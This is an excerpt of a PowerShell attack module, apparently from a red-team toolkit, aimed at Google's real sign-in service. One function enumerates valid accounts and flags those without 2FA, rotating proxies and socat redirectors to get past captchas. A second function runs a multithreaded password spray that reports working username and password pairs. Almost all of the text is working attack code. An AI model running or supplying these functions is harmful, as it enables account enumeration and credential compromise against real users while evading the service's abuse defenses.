...
[Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12
...
function Invoke-UsernameHarvestGmail {
  <#
    .SYNOPSIS
      Enumerate Google Apps user accounts and identify users who opt-out of 2FA
    .DESCRIPTION
       Enumerate Google Apps user accounts and identify users who opt-out of 2FA

       Build Redirectors with => socat TCP-LISTEN:9090,fork TCP:accounts.google.com:443
       ...
       ----------------------------------------
       gf.alr => return status codes
       1   =>  Direct Login
       2   =>  Error (bad character in userid || I think....)
       5   =>  Captcha
       7   =>  Bad User
       9   =>  Account Deleted
       12  =>  Old style Google auth? Or maybe dual accounts found for userid?
       13  =>  Login Redirect
       ----------------------------------------
    ...
    .EXAMPLE
      C:\PS> Invoke-UsernameHarvestGmail -Account
      C:\PS> Invoke-UsernameHarvestGmail -UserFile emails.txt
      C:\PS> Invoke-UsernameHarvestGmail -UserFile emails.txt -ProxyHosts 10.0.0.5:8080,10.0.0.6:8080,10.0.0.10:443
      C:\PS> Invoke-UsernameHarvestGmail -UserFile emails.txt -Detailed
      C:\PS> Invoke-UsernameHarvestGmail -UserFile emails.txt -2FACheckOnly
      C:\PS> Get-Content emails.txt | % { Invoke-UsernameHarvestGmail $_ }
  #>
  ...
  if (($Userfile -ne "" -Or $Account -ne ""))
  {
    Write-Output ""
  }
  else
  {
    Write-Output "[*] A username or file must be specified!"
    break
  }

  function Eval-Alr {
    param([string]$content)
    if ($content.split(",")[1] -eq "13") {
      write-host "User Found! : $username"
      add-content accounts.txt "$username"
    } elseif ($content.split(",")[1] -eq "1") {
      # Direct Login || No 2FA
      write-host "User Found! : $username"
      add-content accounts.txt "$username, No 2FA Redirect!"
    } elseif ($content.split(",")[1] -eq "7") {
      # Not a valid user account
      add-content invalid-users.txt "$username"
    }  else {
      write-host -foregroundcolor "red" "[*] ERROR! unexpected return code encountered while processing user $username Alr Code Recieved: " $content.split(",")[1]
    }
  }

  function Rotate-Proxy {
    param([string]$CurrentUri,[string[]]$ProxyHosts,[string]$BaseUri)

    $position = $ProxyHosts.Count - 1
    if ($ProxyHosts.Indexof($CurrentUri.Split("/")[2]) -eq $position) {
      $index = 0
    } else {
      $index = $ProxyHosts.Indexof($CurrentUri.Split("/")[2]) + 1
    }

    $proxy = $ProxyHosts[$index]
    $uri = "https://$proxy$BaseUri"
    return $uri
  }

  $uri = 'https://accounts.google.com:443/_/signin/sl/lookup?h1=en&_reqid=405224&rt=j'
  $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
  $headers.Add('Host','accounts.google.com')
  $headers.Add('User-Agent','Mozilla/5.0')
  $headers.Add('Accept','*/*')
  $headers.Add('Google-Accounts-XSRF','1')
  $headers.Add('Accept-Language','en-US,en;q=0.5')
  $headers.Add('Accept-Encoding','gzip, deflate')
  $headers.Add('Content-Type','application/x-www-form-urlencoded;charset=utf-8')

  # Add accounts.google.com:443 to proxyhosts
  if ($ProxyHosts -ne "") {
    $Collection = $ProxyHosts += "accounts.google.com:443"
  } else {
    $Collection = @("accounts.google.com:443")
  }
  ...
  if ($UserFile -ne "") {
    Get-Content $UserFile | % {
      ...
      $post = "f.req=%5B%22$username%22%2C%22AEThLlzuv_gJfumv4OdsVB8Hk2xeGxsVvreBkVjbnLnsQ-6KgNnGCfUGUqqBopkWCr0C_0IEyPFiv4Hq458KW--hM7jBIp3dEPvlQcwPcBy8lZ8d27JhAcdVBTFnRxgIGovwI7FXCIrVTN2qufJH0LhGbq0ciEijjn3lDgb9q4uHzLdD-sJyEbhJ0d5FrKMF2sG2pEbk7eP6tFooWhjA-SBBKWPbhky-7g%22%2C%5B%5D%2Cnull%2C%22US%22%2Cnull%2Cnull%2C2%2Cfalse%2Ctrue%2C%5Bnull%2Cnull%2C%5B2%2C1%2Cnull%2C1%2C%22https%3A%2F%2Faccounts.google.com%2FServiceLogin%3Fpassive%3D1209600%26continue%3Dhttps%253A%252F%252Faccounts.google.com%252FManageAccount%26followup%3Dhttps%253A%252F%252Faccounts.google.com%252FManageAccount%22%2Cnull%2C%5B%5D%2C4%5D%2C1%2C%5Bnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Ctrue%5D%2C%22$username%22%5D"

      $uri = Rotate-Proxy -CurrentUri $uri -ProxyHosts $Collection -BaseUri "/_/signin/sl/lookup?h1=en&_reqid=405224&rt=j"

      $res = Invoke-WebRequest -Uri $uri -Headers $headers -Method POST -Body $post

      if ($res.Content.split(",")[1] -eq "5") {
        # Captcha => Sleep and start again
        if ($Detailed) {
          write-host "Code: " $res.Content.split(",")[1]
          write-host "Got Captcha! Hopping and Throttling..."
        }
        $free = 1
        do
        {
          $uri = Rotate-Proxy -CurrentUri $uri -ProxyHosts $Collection -BaseUri "/_/signin/sl/lookup?h1=en&_reqid=405224&rt=j"
          $res = Invoke-WebRequest -Uri $uri -Headers $headers -Method POST -Body $post
          if ($res.Content.split(",")[1] -ne "5") {
            $free = 0
            Eval-Alr -content $res.Content
            if ($Detailed) {
              write-host "Captcha Free"
            }
          } else {
            $free = $free + 1
          }
...
function Invoke-PasswordSprayGmail {
  <#
    .SYNOPSIS
    This module will first attempt to connect to a Gmail Authentication portal and perform a password spraying attack using a userlist and a single password. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!
    ...
    .EXAMPLE
    C:\PS> Invoke-PasswordSprayGmail -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile gmail-sprayed-creds.txt
  ...
  Write-Host -ForegroundColor "yellow" "[*] Now spraying the Gmail portal at https://accounts.google.com/"
  $currenttime = Get-Date
  Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"
  ...
  0..($Threads-1) |% {
    Start-Job -ScriptBlock{
      ...
      ForEach($Username in $args[0])
        ...
        $uri = "https://accounts.google.com/_/signin/sl/lookup?h1=en&_reqid=405224&rt=j"
        $res = Invoke-WebRequest -Uri $uri -Headers $headers -Method POST -Body $post

        # Validate lookup success with alr check
        if ($res.Content.split(",")[1] -eq "5") {
          # Captcha => Sleep and start again
          if ($Detailed) {
            write-host "Code: " $res.Content.split(",")[1]
        ...
        # Get alr token
        $AlrToken = $data.split(",")[2].Replace("`"","")

        # Build challenge
        $post = "f.req=%5B%22$AlrToken%22%2Cnull%2C1%2Cnull%2C%5B1%2Cnull%2Cnull%2Cnull%2C%5B%22$password%22%2Cnull%2Ctrue%5D%5D%2C%5Bnull%2Cnull%2C%5B2%2C1%2Cnull%2C1%2C%22https%3A%2F%2Faccounts.google.com%2FServiceLogin%3Fpassive%3D1209600%26continue%3Dhttps%253A%252F%252Faccounts.google.com%252FManageAccount%26followup%3Dhttps%253A%252F%252Faccounts.google.com%252FManageAccount%26flowName%3DGlifWebSignIn%26flowEntry%3DServiceLogin%22%2Cnull%2C%5B%5D%2C4%5D%2C1%2C%5Bnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Ctrue%5D%5D"

        # Send Challenge
        $uri = "https://accounts.google.com/_/signin/sl/challenge?hl=en&_reqid=759004&rt=j"
        $res = Invoke-WebRequest -Uri $uri -Headers $headers -Method POST -Body $post

        # Eval Success/Fail
        if ($res.content -NotMatch "INCORRECT_ANSWER_ENTERED") {
          write-host "Heh, caught one!"
          Write-Output "[*] SUCCESS! User:$username Password:$password"
        }
      }
    } -ArgumentList $userlists[$_], $Password, $uri, $headers | Out-Null
  }
  $Complete = Get-Date
  $MaxWaitAtEnd = 10000
  $SleepTimer = 200
  ...
  While ($(Get-Job -State Running).count -gt 0){
      ...
      ForEach ($Job  in $(Get-Job -state running)){$RunningJobs += ", $($Job.name)"}
      $RunningJobs = $RunningJobs.Substring(2)
      Write-Progress  -Activity "Password Spraying. Sit tight..." -Status "$($(Get-Job -State Running).count) threads remaining" -PercentComplete ($(Get-Job -State Completed).count / $(Get-Job).count * 100)
      If ($(New-TimeSpan $Complete $(Get-Date)).totalseconds -ge $MaxWaitAtEnd){"Killing all jobs still running . . .";Get-Job -State Running | Remove-Job -Force}
      Start-Sleep -Milliseconds $SleepTimer
      ForEach($Job in Get-Job){
          $JobOutput = Receive-Job $Job
